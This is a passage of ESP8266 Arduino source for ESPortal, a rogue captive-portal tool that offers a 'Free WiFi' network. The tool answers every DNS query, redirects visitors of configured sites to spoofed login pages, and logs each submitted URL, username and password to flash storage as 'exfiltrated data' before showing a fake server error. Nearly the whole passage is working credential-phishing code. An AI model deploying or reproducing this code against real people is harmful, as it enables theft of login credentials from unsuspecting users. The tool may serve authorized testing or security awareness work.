Y8j75oEKy0lge1E0iYtdoJDETo0v5KO4GEWaWdwECELu06RKFV7cQJexG/0U5iIIKWFnMqabyHtfNIkIdCnc8KQUtr4RShfoKdGggxSLvcZHuYknqQtn5AO4nBCF5a/JnahmKNdh4J8Xu0+XbtJAYjeGkti7QTSIiF2gl0IxZp5dn7v2knkQCy+dt92kl0Iwpp7Zbmt2vnkQALmvalECEThbQW2TDiFe0kepgnEUu0k8hDTNKOR7xJO4ke5uYQn1LoRBTSNhqN81Eslv+pnEovs1o7gbwELy2EHYNiBeII7Vx6nFVo6yheUxC0tGjEk002AhyrnUsCjEKsi0HcYKVF48nbIeVHhZO0c0kIEfe3aPug2zxIadFocsElb4c8QzuXBBltshE3WHGDk9a+zlRuvfDtkHqIuMGOuMFJC25FTNVOgph3mkzcE7UTaScoadFAV6O4QjsPcoAgxQ1GWjTMpShu0s6DHMTpJjBxg5AWDXKByX6mLfvjgaxNkFE66CV1EdMv7nDtRAR1adEQ40y20PvwCtXMaTabC0x28db1NZUJIusKllasIxxxZVGPVoBTTPYeqWaFWNhW59EmG7Wr1Fkk+kqcd1+N+a1HiGjyV2yRg/pkUBiu6o2isMfbBqjSgPdIZwxQv8yRdycsrTzFLFOmQ9uO/R0Hdct2ScOSkhYcZUeAKg23DnFkl+PI1e/GBKX9A+LMQY5/a8ziaggr8+gVFRvsccRxBY73WcRzCUgrf1muRRyeI4dbHBxvi4a4GtLeXrGhnkKMLHFcWcsgc7r9PSitvMH7+6bgXBPc7EjcE3pWWvCVig0k+/+PrZiD3K14uIekfQgxpkJ7fNtBDo/XKW6dwn6qYsO8hrjAYT4fRzwWsbQiykRHbfGtmMStS9gLrXRVGuWTHnN7MBJp5ccTmYue7aEdFjgQVwaBodFLC95tqt96uqaGPOXm+VyTXXmHJO1OxA8Q8qvhIZ7bYH4M4voW4VSTvROsSiPc4VvYDnmfhviSyZ6aeFZBWtlVR5ZnTjFdbut5OPdvOhI3192dMtGwiXqh0WhIp4+vUIUsBJ+KHF93lFIpcB4jUZxlQx4BOs5kdyOkfAr5TShY3y9RyGMtL9p4wWTb9W+SQH073WVfHOQ3z2QXzVVYgvO41EU+7XiTFicuslZ5wnMD4vxmtt0nqRn039dNNl2qwmT0n/MdGH0umKmykFv+PE6isHqg7a9D8bWK1UxykUs7PqV9R8nvyS9X45vZi0KIIuiDG1B8tUIV41zl0opPaY8p8R0ZWWWEfcJ1MqQc6IsbUdygnUcrPqV9tODn5WJrBhppo49kSHnQJzJNuK7EV/tc5yL4lLboK30u9zFpJ25A33zDFL8w89Kf3qTFSa5EsTLnx+fh89/zlQtxA/qoyK2wJb4GId/3aYei+J3Jfm3qhOzSdz1ymO8tCeIc9OvnTbZCbKBdLH+NmO7rfrPXZ8SQtNwJkA3kZAX9P1v+00sme0/VuRQ2PtBnd6B4j8lWmL1k/9/ycKksDJ+NuNDnDyReR9qDDtZoyEZyb0P8o1nngYk30Kfy7NmpiGfRpXtqOSbdIbGh/gg5IUWhtCQ6KC2JDkpLooPSkuigtCQ6KC2JDkpLooPSkuj4bwAAAP//z7m+jW7q4SgAAAAASUVORK5CYII='><br><i>by Corey Harding<br>www.LegacySecurityGroup.com / www.Exploit.Agency</i><br>-----<br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+F("<br>-----<br><a href=\"/logs\">List Exfiltrated Data</a><br>-<br><a href=\"/settings\">Configure ESPortal</a><br>-<br><a href=\"/format\">Format File System</a><br>-<br><a href=\"/firmware\">Upgrade ESPortal Firmware</a><br>-<br><a href=\"/help\">Help</a></body></html>"));
  });
  if (esportalenabled==1){
  
    server.onNotFound([]() {
      String responseHTML = String()+
      F(
      ""
      "<!DOCTYPE html>"
      "<html>"
      "<body>"
      "<script>"
      "if (document.domain==\"")+local_IPstr+F("\"||document.domain==\"go.microsoft.com\"||document.domain==\"detectportal.firefox.com\")"
      "{"
      "window.open(\"http://")+welcome_domain+welcome_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site1_domain+F("\"||document.domain==\"www.")+site1_domain+F("\"||document.domain==\"mobile.")+site1_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site1_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site2_domain+F("\"||document.domain==\"www.")+site2_domain+F("\"||document.domain==\"mobile.")+site2_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site2_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site3_domain+F("\"||document.domain==\"www.")+site3_domain+F("\"||document.domain==\"mobile.")+site3_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site3_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site4_domain+F("\"||document.domain==\"www.")+site4_domain+F("\"||document.domain==\"mobile.")+site4_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site4_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site5_domain+F("\"||document.domain==\"www.")+site5_domain+F("\"||document.domain==\"mobile.")+site5_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site5_redirect+F("\",\"_self\");"
      "}"
/*      "else if (document.domain==\"")+site6_domain+F("\"||document.domain==\"www.")+site6_domain+F("\"||document.domain==\"mobile.")+site6_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site6_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site7_domain+F("\"||document.domain==\"www.")+site7_domain+F("\"||document.domain==\"mobile.")+site7_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site7_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site8_domain+F("\"||document.domain==\"www.")+site8_domain+F("\"||document.domain==\"mobile.")+site8_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site8_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site9_domain+F("\"||document.domain==\"www.")+site9_domain+F("\"||document.domain==\"mobile.")+site9_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site9_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site10_domain+F("\"||document.domain==\"www.")+site10_domain+F("\"||document.domain==\"mobile.")+site10_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site10_redirect+F("\",\"_self\");"
      "}"
*/      "else"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site_other_redirect+F("\",\"_self\");"
      "}"
      "</script>"
      "<body>"
      "</html>");
      if (!RawFile(server.uri())){
        File f = SPIFFS.open("/captiveportal.html", "r");
          if (f) {
           server.streamFile(f, "text/html");
         }
          else {
           server.send(200, "text/html", responseHTML);
         }
        f.close();
      }
    });
  
    //Portal welcome page
    server.on(welcome_redirect,[]() {
        File f = SPIFFS.open("/welcome.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", PORTAL_LOGIN_HTML);
          }
        f.close();
    });
    
    //generic catch all login page for domains not listed in configuration
    server.on(site_other_redirect,[]() {
        File f = SPIFFS.open("/spoof_other.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE_OTHER_HTML);
          }
        f.close();
    });
  
    //SITE1 login page
    server.on(site1_redirect,[]() {
        File f = SPIFFS.open("/spoof_site1.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE1_HTML);
          }
        f.close();
    });
  
    //SITE2 login page
    server.on(site2_redirect,[]() {
        File f = SPIFFS.open("/spoof_site2.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE2_HTML);
          }
        f.close();
    });
  
    //SITE3 login page
    server.on(site3_redirect,[]() {
        File f = SPIFFS.open("/spoof_site3.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE3_HTML);
          }
        f.close();
    });

    //SITE4 login page
    server.on(site4_redirect,[]() {
        File f = SPIFFS.open("/spoof_site4.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE4_HTML);
          }
        f.close();
    });

    //SITE5 login page
    server.on(site5_redirect,[]() {
        File f = SPIFFS.open("/spoof_site5.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE5_HTML);
          }
        f.close();
    });
/*
    //SITE6 login page
    server.on(site6_redirect,[]() {
        File f = SPIFFS.open("/spoof_site6.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE6_HTML);
          }
        f.close();
    });

    //SITE7 login page
    server.on(site7_redirect,[]() {
        File f = SPIFFS.open("/spoof_site7.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE7_HTML);
          }
        f.close();
    });

    //SITE8 login page
    server.on(site8_redirect,[]() {
        File f = SPIFFS.open("/spoof_site8.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE8_HTML);
          }
        f.close();
    });

    //SITE9 login page
    server.on(site9_redirect,[]() {
        File f = SPIFFS.open("/spoof_site9.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE9_HTML);
          }
        f.close();
    });

    //SITE10 login page
    server.on(site10_redirect,[]() {
        File f = SPIFFS.open("/spoof_site10.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE10_HTML);
          }
        f.close();
    });
*/    
    server.on("/validate", []() {
      String url = server.arg("url");
      String user = server.arg("user");
      String pass = server.arg("pass");
      String filename;
      if (singlelog==1) {
        filename = "esportal-log.txt";
      }
      else if (singlelog==0) {
        filename = url.substring(0,30);
      }
      File f = SPIFFS.open(String()+"/"+filename, "a");
      f.print(url);
      f.print(":");
      f.print(user);
      f.print(":");
      f.println(pass);
      f.close();
      File f2 = SPIFFS.open("/error.html", "r");
        if (f2) {
          server.streamFile(f2, "text/html");
        }
        else {
          server.send(200, "text/html", F("HTTP Error 500 Internal server error"));
        }
      f2.close();
    });
  }
  else {
    server.onNotFound([]() {
    if (!RawFile(server.uri()))
      server.send(404, "text/plain", F("Error 404 File Not Found"));
    });
  }
  
  server.on("/settings", handleSettings);

  server.on("/firmware", [](){
    server.send(200, "text/html", String()+F("<html><body style=\"height: 100%;\"><a href=\"/esportal\"><- BACK TO INDEX</a><br><br>Open Arduino IDE.<br>Pull down Sketch Menu then select Export Compiled Binary.<br>Open Sketch Folder and upload the exported BIN file.<br>You may need to manually reboot the device to reconnect.<br><iframe style =\"border: 0; height: 100%;\" src=\"http://")+local_IPstr+F(":1337/update\"><a href=\"http://")+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe></body></html>"));
  });

  server.on("/restoredefaults", [](){
    server.send(200, "text/html", F("<html><body>This will restore the device to the default configuration.<br><br>Are you sure?<br><br><a href=\"/restoredefaults/yes\">YES</a> - <a href=\"/esportal\">NO</a></body></html>"));
  });

  server.on("/restoredefaults/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/esportal\"><- BACK TO INDEX</a><br><br>Network<br>---<br>SSID: <b>Free WiFi</b><br><br>Administration<br>---<br>USER: <b>admin</b> PASS: <b>hacktheplanet</b>"));
    loadDefaults();
    ESP.restart();
  });

  server.on("/deletelog", [](){
    String deletelog;
    deletelog += server.arg(0);
    server.send(200, "text/html", String()+F("<html><body>This will delete the file: ")+deletelog+F(".<br><br>Are you sure?<br><br><a href=\"/deletelog/yes?payload=")+deletelog+F("\">YES</a> - <a href=\"/esportal\">NO</a></body></html>"));
  });

  server.on("/viewlog", ViewLog);

  server.on("/deletelog/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    String deletelog;
    deletelog += server.arg(0);
    if (!deletelog.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/esportal\"><- BACK TO INDEX</a><br><br><a href=\"/logs\">List Exfiltrated Data</a><br><br>Deleting file: ")+deletelog);
    SPIFFS.remove(deletelog);
  });

  server.on("/format", [](){
    server.send(200, "text/html", F("<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><br>This will reformat the SPIFFS File System.<br><br>Are you sure?<br><br><a href=\"/format/yes\">YES</a> - <a href=\"/esportal\">NO</a></body></html>"));
  });

  server.on("/logs", ListLogs);

  server.on("/reboot", [](){
    if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/esportal\"><- BACK TO INDEX</a><br><br>Rebooting ESPortal..."));
    ESP.restart();
  });
  
  server.on("/format/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/esportal\"><- BACK TO INDEX</a><br><br>Formatting file system: This may take up to 90 seconds"));
//    Serial.print("Formatting file system...");
    SPIFFS.format();
//    Serial.println(" Success");
    saveConfig();
  });
  
  server.on("/help", []() {
    server.send_P(200, "text/html", HelpText);
  });
  
  server.on("/license", []() {
    server.send_P(200, "text/html", License);
  });
  
  server.begin();
  WiFiClient client;
  client.setNoDelay(1);

//  Serial.println("Web Server Started");

  MDNS.begin("ESPortal");

  httpUpdater.setup(&httpServer, update_path, update_username, update_password);
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  if (esportalenabled==1){
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  }
  
  if (ftpenabled==1){
    ftpSrv.begin(String(ftp_username),String(ftp_password));
  }
  
}

void loop() {
  if (ftpenabled==1){
    ftpSrv.handleFTP();
  }
  server.handleClient();
  httpServer.handleClient();
  if (esportalenabled==1){
    dnsServer.processNextRequest();
  }
  while (Serial.available()) {
    String cmd = Serial.readStringUntil(':');
        if(cmd == "ResetDefaultConfig"){
          loadDefaults();
          ESP.restart();
        }
  }
//  drd.loop();
//Serial.print("Free heap-");
//Serial.println(ESP.getFreeHeap(),DEC);
}
